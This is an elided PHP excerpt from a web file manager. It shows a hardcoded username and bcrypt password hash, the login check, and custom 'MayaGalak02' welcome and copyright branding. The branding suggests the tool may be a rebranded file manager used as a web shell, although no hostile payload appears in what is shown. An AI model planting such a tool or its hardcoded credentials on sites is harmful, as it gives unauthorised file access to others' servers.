...
$use_auth = true;
$auth_users = array(
    '070223' => '$2y$10$qqKWA9nu9ZP.CxsuAor5dubFQ5N9WF/2/N.WQ6naEhE.VMqGhUAyC',
);
    ...
    if (isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_ID]['logged']])) {
        ...
        if(function_exists('password_verify')) {
            if (isset($auth_users[$_POST['fm_usr']]) && isset($_POST['fm_pwd']) && password_verify($_POST['fm_pwd'], $auth_users[$_POST['fm_usr']]) && verifyToken($_POST['token'])) {
                ...
                fm_set_msg(lng('welcome MayaGalak02!'));
                fm_redirect(FM_SELF_URL);
            } else {
                unset($_SESSION[FM_SESSION_ID]['logged']);
...
<form action="" method="post" class="pt-3">
    ...
    <div class="row">
        ...
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;MayaGalak02</a></div>
        <?PHp else: ?>
        <div class="col-3 d-none d-sm-block"><a class="float-right text-muted">&copy;MayaGalak02</a></div>
        <?PHp endif; ?>
    </div>
...
function lng($txt) {
    ...
    $tr['en']['HideColumns']    = 'Hide Perms/Owner columns';$tr['en']['welcome MayaGalak02!']     = 'welcome MayaGalak02!';
